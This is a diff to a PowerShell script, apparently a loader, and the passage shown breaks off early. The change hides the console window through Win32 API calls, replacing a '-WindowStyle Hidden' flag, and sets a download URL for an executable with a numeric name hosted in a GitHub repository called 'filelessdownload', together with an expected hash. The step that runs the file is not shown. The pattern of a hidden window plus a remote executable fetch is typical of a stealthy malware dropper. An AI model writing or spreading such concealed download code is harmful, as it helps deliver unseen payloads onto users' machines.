@@ -1,5 +1,15 @@
 # no worries, ill do with a private server later
--WindowStyle Hidden
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+
+$consolePtr = [Console.Window]::GetConsoleWindow()
+# 0 = oculta a janela
+[Console.Window]::ShowWindow($consolePtr, 0)
 $Host.UI.RawUI.BackgroundColor = "Black"
 $downloadUrl = "https://github.com/mateuscobe-max/filelessdownload/releases/download/latest/32759017815.exe"
 $expectedHash = "AD6D7289E40B8BB2502267ECC8B36A4FF25068AADFA5441F9EC1325C16EB467B".ToUpperInvariant()
